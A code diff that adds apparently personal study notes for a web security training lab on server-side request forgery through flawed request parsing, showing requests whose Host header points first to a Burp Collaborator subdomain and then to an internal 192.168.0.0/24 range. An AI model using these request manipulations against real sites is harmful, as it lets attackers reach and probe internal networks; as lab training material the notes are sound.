@@ -360,7 +360,18 @@ intranet.example.com: 10.0.0.132
 
 
 
+<> Lab: SSRF via flawed request parsing
+# Use Burp Collaborator client to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:
 
+STEP 1: 
+
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: BURP-COLLABORATOR-SUBDOMAIN
+
+STEP 2: 
+
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: 192.168.0.0/24
 
 
 
